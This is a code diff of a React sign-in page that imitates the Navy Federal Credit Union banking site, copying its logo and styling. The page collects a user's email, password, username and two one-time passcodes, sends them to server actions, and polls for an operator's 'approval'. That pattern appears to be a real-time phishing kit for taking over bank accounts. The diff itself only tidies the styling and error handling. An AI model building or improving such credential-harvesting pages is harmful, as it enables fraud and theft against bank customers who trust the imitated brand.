@@ -1,10 +1,8 @@
 'use client'
 
-import React, { useEffect, useState } from 'react'
+import { useEffect, useState } from 'react'
 
-// NOTE: Ensure this path correctly points to your Server Actions file.
-// If actions.ts is in the app/ root and this file is app/page.tsx, use './actions'.
-// If this file is in app/banking/page.tsx, use '../actions'.
+// Adjust this relative path if your actions.ts is located elsewhere (e.g., '../actions')
 import {
   startChallenge,
   submitUsername,
@@ -26,36 +24,28 @@ const WAIT_MSG =
 
 export default function NavyFederalBanking() {
   const [step, setStep] = useState<Step>('credentials')
-  const [email, setEmail] = useState<string>('')
-  const [password, setPassword] = useState<string>('')
-  const [username, setUsername] = useState<string>('')
-  const [otp, setOtp] = useState<string>('')
+  const [email, setEmail] = useState('')
+  const [password, setPassword] = useState('')
+  const [username, setUsername] = useState('')
+  const [otp, setOtp] = useState('')
   const [attemptId, setAttemptId] = useState<string | null>(null)
   const [error, setError] = useState<string | null>(null)
   const [note, setNote] = useState<string | null>(null)
-  const [loading, setLoading] = useState<boolean>(false)
-  const [showPassword, setShowPassword] = useState<boolean>(false)
+  const [loading, setLoading] = useState(false)
+  const [showPassword, setShowPassword] = useState(false)
 
   useEffect(() => {
     if (step !== 'awaiting_approval' || !attemptId) return
     let cancelled = false
-
     const tick = async () => {
-      try {
-        const s = await getStatus(attemptId)
-        if (cancelled) return
-        if (s?.status === 'approved') setStep('approved_success')
-        if (s?.status === 'rejected' || s?.status === 'expired') {
-          setStep('rejected')
-          setError('Sign-in was rejected.')
-        }
-      } catch (err) {
-        if (!cancelled) {
-          setError(err instanceof Error ? err.message : 'Status check failed')
-        }
+      const s = await getStatus(attemptId)
+      if (cancelled) return
+      if (s.status === 'approved') setStep('approved_success')
+      if (s.status === 'rejected' || s.status === 'expired') {
+        setStep('rejected')
+        setError('Sign-in was rejected.')
       }
     }
-
     tick()
     const id = setInterval(tick, 2500)
     return () => {
@@ -64,25 +54,23 @@ export default function NavyFederalBanking() {
     }
   }, [step, attemptId])
 
-  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
+  async function onSubmit(e: React.FormEvent) {
     e.preventDefault()
     setError(null)
     setLoading(true)
-
     try {
       if (step === 'credentials') {
         const r = await startChallenge({ email, password })
         setLoading(false)
-        if (!r || !r.ok) {
-          setError(r?.error || 'Authentication failed.')
+        if (!r.ok) {
+          setError(r.error)
           return
         }
-        setAttemptId(r.attemptId ?? null)
+        setAttemptId(r.attemptId)
         setStep('username')
         setNote(null)
         return
       }
-
       if (step === 'username') {
         if (!attemptId) {
           setLoading(false)
@@ -91,8 +79,8 @@ export default function NavyFederalBanking() {
         }
         const r = await submitUsername({ attemptId, username })
         setLoading(false)
-        if (!r || !r.ok) {
-          setError(r?.error || 'Username verification failed.')
+        if (!r.ok) {
+          setError(r.error)
           return
         }
         setOtp('')
@@ -100,7 +88,6 @@ export default function NavyFederalBanking() {
         setNote('Code sent to your email.')
         return
       }
-
       if (step === 'otp1' || step === 'otp2') {
         if (!attemptId) {
           setLoading(false)
@@ -110,8 +97,8 @@ export default function NavyFederalBanking() {
         const which = step === 'otp1' ? 1 : 2
         const r = await submitOtp({ attemptId, otp, which })
         setLoading(false)
-        if (!r || !r.ok) {
-          setError(r?.error || 'Invalid code.')
+        if (!r.ok) {
+          setError(r.error)
           return
         }
         setOtp('')
@@ -125,7 +112,7 @@ export default function NavyFederalBanking() {
       }
     } catch (err) {
       setLoading(false)
-      setError(err instanceof Error ? err.message : 'An unexpected error occurred.')
+      setError(err instanceof Error ? err.message : 'Error')
     }
   }
 
@@ -140,26 +127,21 @@ export default function NavyFederalBanking() {
 
   return (
     <div style={styles.container}>
-      {/* Navigation Header */}
+      {/* Header */}
       <header style={styles.header}>
         <div style={styles.headerLeft}>
           <button style={styles.iconBtn} aria-label="Menu" type="button">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round">
-              <line x1="3" y1="6" x2="21" y2="6" />
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
               <line x1="3" y1="12" x2="21" y2="12" />
+              <line x1="3" y1="6" x2="21" y2="6" />
               <line x1="3" y1="18" x2="21" y2="18" />
             </svg>
           </button>
-          
           <div style={styles.logoGroup}>
-            {/* Globe Grid Icon */}
-            <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2">
-              <circle cx="12" cy="12" r="10" strokeWidth="1.5" />
-              <line x1="2" y1="12" x2="22" y2="12" strokeWidth="1.5" />
-              <line x1="3.5" y1="7.5" x2="20.5" y2="7.5" />
-              <line x1="3.5" y1="16.5" x2="20.5" y2="16.5" />
-              <line x1="12" y1="2" x2="12" y2="22" strokeWidth="1.5" />
-              <ellipse cx="12" cy="12" rx="6" ry="10" />
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+              <circle cx="12" cy="12" r="10" />
+              <line x1="2" y1="12" x2="22" y2="12" />
+              <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
             </svg>
             <span style={styles.logoText}>NAVY FEDERAL</span>
           </div>
@@ -222,26 +204,25 @@ export default function NavyFederalBanking() {
                             required
                             value={password}
                             onChange={(e) => setPassword(e.target.value)}
-                            style={styles.inputWithEye}
+                            style={styles.input}
                             autoComplete="current-password"
                           />
                           <button
                             type="button"
-                            onClick={() => setShowPassword((prev) => !prev)}
+                            onClick={() => setShowPassword(!showPassword)}
                             style={styles.eyeBtn}
-                            aria-label={showPassword ? 'Hide password' : 'Show password'}
+                            aria-label="Toggle password visibility"
                           >
-                            {showPassword ? (
-                              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
-                                <line x1="1" y1="1" x2="23" y2="23" />
-                              </svg>
-                            ) : (
-                              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
-                                <circle cx="12" cy="12" r="3" />
-                              </svg>
-                            )}
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2">
+                              {showPassword ? (
+                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24M1 1l22 22" />
+                              ) : (
+                                <>
+                                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                                  <circle cx="12" cy="12" r="3" />
+                                </>
+                              )}
+                            </svg>
                           </button>
                         </div>
                       </div>
@@ -336,16 +317,12 @@ export default function NavyFederalBanking() {
         {/* Footer */}
         <footer style={styles.footer}>
           <div style={styles.logoGroupFooter}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#10305a" strokeWidth="1.2">
-              <circle cx="12" cy="12" r="10" strokeWidth="1.5" />
-              <line x1="2" y1="12" x2="22" y2="12" strokeWidth="1.5" />
-              <line x1="3.5" y1="7.5" x2="20.5" y2="7.5" />
-              <line x1="3.5" y1="16.5" x2="20.5" y2="16.5" />
-              <line x1="12" y1="2" x2="12" y2="22" strokeWidth="1.5" />
-              <ellipse cx="12" cy="12" rx="6" ry="10" />
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#10305a" strokeWidth="2">
+              <circle cx="12" cy="12" r="10" />
+              <line x1="2" y1="12" x2="22" y2="12" />
             </svg>
             <div>
-              <div style={{ fontWeight: 800, fontSize: 15, color: '#10305a', fontStyle: 'normal', letterSpacing: '0.5px' }}>NAVY FEDERAL</div>
+              <div style={{ fontWeight: 800, fontSize: 16, color: '#10305a', fontStyle: 'italic' }}>NAVY FEDERAL</div>
               <div style={{ fontSize: 10, textTransform: 'uppercase', color: '#10305a', fontWeight: 600 }}>Credit Union</div>
             </div>
           </div>
@@ -358,45 +335,43 @@ export default function NavyFederalBanking() {
   )
 }
 
-const styles: Record<string, React.CSSProperties> = {
+const styles: { [key: string]: React.CSSProperties } = {
   container: {
     minHeight: '100vh',
     backgroundColor: '#143260',
-    fontFamily: 'Arial, Helvetica, sans-serif',
+    fontFamily: 'system-ui, -apple-system, sans-serif',
     color: '#2d3748',
     margin: 0,
   },
   header: {
-    backgroundColor: '#0d3e75',
+    backgroundColor: '#104780',
     color: '#ffffff',
-    padding: '14px 16px',
-    borderBottom: '1px solid #092c54',
+    padding: '12px 16px',
+    borderBottom: '1px solid #0c3663',
   },
   headerLeft: {
     display: 'flex',
     alignItems: 'center',
-    gap: 16,
+    gap: 12,
   },
   iconBtn: {
     background: 'none',
     border: 'none',
     color: '#fff',
     cursor: 'pointer',
-    padding: 2,
+    padding: 4,
     display: 'flex',
-    alignItems: 'center',
   },
   logoGroup: {
     display: 'flex',
     alignItems: 'center',
-    gap: 10,
+    gap: 8,
   },
   logoText: {
     fontWeight: 800,
-    fontSize: 22,
-    fontStyle: 'normal',
-    letterSpacing: '0.5px',
-    fontFamily: 'Arial Black, Arial, sans-serif',
+    fontSize: 18,
+    fontStyle: 'italic',
+    letterSpacing: '-0.5px',
   },
   main: {
     maxWidth: 440,
@@ -475,26 +450,14 @@ const styles: Record<string, React.CSSProperties> = {
     boxSizing: 'border-box',
     outline: 'none',
   },
-  inputWithEye: {
-    width: '100%',
-    padding: '10px 40px 10px 12px',
-    backgroundColor: '#ffffff',
-    border: '1px solid #a0aec0',
-    borderRadius: 4,
-    fontSize: 15,
-    boxSizing: 'border-box',
-    outline: 'none',
-  },
   eyeBtn: {
     position: 'absolute',
     right: 10,
     background: 'none',
     border: 'none',
     cursor: 'pointer',
-    padding: 4,
+    padding: 0,
     display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'center',
   },
   dottedLink: {
     fontSize: 12,
